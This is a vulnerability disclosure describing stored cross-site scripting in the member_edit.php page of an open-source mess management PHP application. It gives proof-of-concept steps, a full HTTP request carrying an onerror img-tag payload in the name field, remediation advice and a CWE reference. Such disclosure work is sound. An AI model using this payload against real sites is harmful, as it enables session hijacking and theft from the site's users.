# boyiddha / Automated-Mess-Management-System - /member/member_edit.phpStored XSS

## Vendor Homepage:
[Automated-Mess-Management-System](https://github.com/boyiddha/Automated-Mess-Management-System)

## Impact
The presence of Stored Cross-Site Scripting (XSS) in the /member/member_edit.php endpoint of boyiddha's Automated-Mess-Management-System poses a significant security risk. Attackers can exploit this vulnerability to inject malicious scripts into the application, which will be executed within the context of other users' browsers upon viewing the infected page. This could result in unauthorized access to sensitive information, session hijacking, defacement of web pages, or phishing attacks targeting users. Furthermore, if an attacker manages to exploit an administrative account with injected scripts, it could lead to complete compromise of the system, posing a significant risk to data confidentiality, integrity, and overall system security.

## Proof of Concept
Step 1: Login as a member.\
Step 2: Go to Update membership\
Step 3: Edit the member information with the payload "><img src=x onerror=alert("NoChizPlz")> on the fullname parameter\
Step 4: Click Update
Step 5: Injected payload will reflect after reload


## HTTP Request Example
``` http request
POST /member/member_edit.php?edit=[REDACTED] HTTP/1.1
Host: [REDACTED]
Content-Length: 795
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0gvZpaMviFXnB8sJ
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: [REDACTED]
Connection: close

------WebKitFormBoundary0gvZpaMviFXnB8sJ
Content-Disposition: form-data; name="name"

><img src=x onerror=alert("NoChizPlz")>
------WebKitFormBoundary0gvZpaMviFXnB8sJ
Content-Disposition: form-data; name="email"

[REDACTED]
------WebKitFormBoundary0gvZpaMviFXnB8sJ
Content-Disposition: form-data; name="password"

[REDACTED]
------WebKitFormBoundary0gvZpaMviFXnB8sJ
Content-Disposition: form-data; name="phone"

[REDACTED]
------WebKitFormBoundary0gvZpaMviFXnB8sJ
Content-Disposition: form-data; name="room"

302
------WebKitFormBoundary0gvZpaMviFXnB8sJ
Content-Disposition: form-data; name="address"

[REDACTED]
------WebKitFormBoundary0gvZpaMviFXnB8sJ
Content-Disposition: form-data; name="update"

Update 
------WebKitFormBoundary0gvZpaMviFXnB8sJ--

```
## Proof with Screenshot

## Remidiation
To mitigate this issue, developers should implement proper input validation and output encoding to prevent the execution of malicious scripts. Additionally, the application should sanitize user inputs to neutralize any potentially harmful content before rendering it in the browser.

## CWE
[CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
